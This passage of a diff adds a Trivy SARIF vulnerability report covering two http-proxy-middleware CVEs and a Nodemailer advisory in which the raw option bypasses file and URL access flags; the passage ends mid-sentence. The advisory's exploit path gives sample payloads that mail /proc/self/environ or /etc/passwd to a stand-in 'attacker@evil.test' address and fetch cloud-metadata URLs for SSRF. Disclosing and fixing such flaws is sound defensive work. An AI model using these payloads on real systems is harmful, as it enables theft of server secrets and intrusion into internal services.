@@ -1,0 +1,252 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Trivy Vulnerability Scanner",
+          "informationUri": "https://github.com/aquasecurity/trivy",
+          "name": "Trivy",
+          "rules": [
+            {
+              "id": "CVE-2026-55603",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "http-proxy-middleware: multipart/form-data field injection via unescaped CRLF in `fixRequestBody`"
+              },
+              "fullDescription": {
+                "text": "http-proxy-middleware is node.js http-proxy middleware. From 3.0.4 until 3.0.7 and 4.1.1, fixRequestBody() is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the outgoing Content-Type is multipart/form-data, it rebuilds the body with handlerFormDataBodyData(), which interpolates each req.body key and value directly into the multipart wire format without neutralizing CR/LF. A \\r\\n inside a value (or key) lets an attacker close the current part and inject an entirely new form part. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on req.body is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary. This vulnerability is fixed in 3.0.7 and 4.1.1."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-55603",
+              "help": {
+                "text": "Vulnerability CVE-2026-55603\nSeverity: HIGH\nPackage: http-proxy-middleware\nFixed Version: 3.0.7, 4.1.1\nLink: [CVE-2026-55603](https://avd.aquasec.com/nvd/cve-2026-55603)\nhttp-proxy-middleware is node.js http-proxy middleware. From 3.0.4 until 3.0.7 and 4.1.1, fixRequestBody() is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the outgoing Content-Type is multipart/form-data, it rebuilds the body with handlerFormDataBodyData(), which interpolates each req.body key and value directly into the multipart wire format without neutralizing CR/LF. A \\r\\n inside a value (or key) lets an attacker close the current part and inject an entirely new form part. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on req.body is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary. This vulnerability is fixed in 3.0.7 and 4.1.1.",
+                "markdown": "**Vulnerability CVE-2026-55603**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|http-proxy-middleware|3.0.7, 4.1.1|[CVE-2026-55603](https://avd.aquasec.com/nvd/cve-2026-55603)|\n\nhttp-proxy-middleware is node.js http-proxy middleware. From 3.0.4 until 3.0.7 and 4.1.1, fixRequestBody() is the library's documented helper for re-emitting a request body that was already consumed by a body parser. When the outgoing Content-Type is multipart/form-data, it rebuilds the body with handlerFormDataBodyData(), which interpolates each req.body key and value directly into the multipart wire format without neutralizing CR/LF. A \\r\\n inside a value (or key) lets an attacker close the current part and inject an entirely new form part. Because the proxy's own body parser saw a single opaque value, any gateway-side policy or validation performed on req.body is evaluated against a different set of fields than the upstream backend ultimately parses a request/parameter desynchronization across the trust boundary. This vulnerability is fixed in 3.0.7 and 4.1.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-55602",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass"
+              },
+              "fullDescription": {
+                "text": "http-proxy-middleware is node.js http-proxy middleware. From 0.16.0 until 2.0.10, 3.0.6, and 4.1.0, http-proxy-middleware documents router proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted Host header that is only a superstring match for a configured host+path key can still route a request to an unintended backend. This vulnerability is fixed in 2.0.10, 3.0.6, and 4.1.0."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-55602",
+              "help": {
+                "text": "Vulnerability CVE-2026-55602\nSeverity: MEDIUM\nPackage: http-proxy-middleware\nFixed Version: 3.0.6, 4.1.0, 2.0.10\nLink: [CVE-2026-55602](https://avd.aquasec.com/nvd/cve-2026-55602)\nhttp-proxy-middleware is node.js http-proxy middleware. From 0.16.0 until 2.0.10, 3.0.6, and 4.1.0, http-proxy-middleware documents router proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted Host header that is only a superstring match for a configured host+path key can still route a request to an unintended backend. This vulnerability is fixed in 2.0.10, 3.0.6, and 4.1.0.",
+                "markdown": "**Vulnerability CVE-2026-55602**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|http-proxy-middleware|3.0.6, 4.1.0, 2.0.10|[CVE-2026-55602](https://avd.aquasec.com/nvd/cve-2026-55602)|\n\nhttp-proxy-middleware is node.js http-proxy middleware. From 0.16.0 until 2.0.10, 3.0.6, and 4.1.0, http-proxy-middleware documents router proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted Host header that is only a superstring match for a configured host+path key can still route a request to an unintended backend. This vulnerability is fixed in 2.0.10, 3.0.6, and 4.1.0."
+              },
+              "properties": {
+                "cvssv40_baseScore": 6.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "5.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-p6gq-j5cr-w38f",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message"
+              },
+              "fullDescription": {
+                "text": "# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` — root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` — the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` — `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` — `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: \u003cuserControlled\u003e , to: \u003cuserControlled\u003e })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for — the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard — the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, …)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message → **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL →\n   Nodemailer fetches it server-side and delivers the full response body in the email →\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** — message data routinely originates over the network in the apps these flags protect.\n- **AC** — a single crafted `raw` object; deterministic.\n- **PR** — the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** — no victim interaction.\n- **S** — impact within Nodemailer's process scope.\n- **C** — arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** — attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry — attachment `{path}` is blocked but `raw:{path}` is not — is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` → `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` — local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) — flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED — sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED — fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/advisories/GHSA-p6gq-j5cr-w38f",
+              "help": {
+                "text": "Vulnerability GHSA-p6gq-j5cr-w38f\nSeverity: HIGH\nPackage: nodemailer\nFixed Version: 9.0.1\nLink: [GHSA-p6gq-j5cr-w38f](https://github.com/advisories/GHSA-p6gq-j5cr-w38f)\n# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` — root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` — the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` — `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` — `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: \u003cuserControlled\u003e , to: \u003cuserControlled\u003e })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for — the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard — the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, …)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message → **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL →\n   Nodemailer fetches it server-side and delivers the full response body in the email →\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** — message data routinely originates over the network in the apps these flags protect.\n- **AC** — a single crafted `raw` object; deterministic.\n- **PR** — the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** — no victim interaction.\n- **S** — impact within Nodemailer's process scope.\n- **C** — arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** — attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry — attachment `{path}` is blocked but `raw:{path}` is not — is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` → `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` — local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) — flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED — sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED — fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests.",
+                "markdown": "**Vulnerability GHSA-p6gq-j5cr-w38f**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|nodemailer|9.0.1|[GHSA-p6gq-j5cr-w38f](https://github.com/advisories/GHSA-p6gq-j5cr-w38f)|\n\n# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` — root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` — the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` — `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` — `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: \u003cuserControlled\u003e , to: \u003cuserControlled\u003e })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for — the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard — the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, …)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message → **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL →\n   Nodemailer fetches it server-side and delivers the full response body in the email →\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** — message data routinely originates over the network in the apps these flags protect.\n- **AC** — a single crafted `raw` object; deterministic.\n- **PR** — the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** — no victim interaction.\n- **S** — impact within Nodemailer's process scope.\n- **C** — arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** — attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted 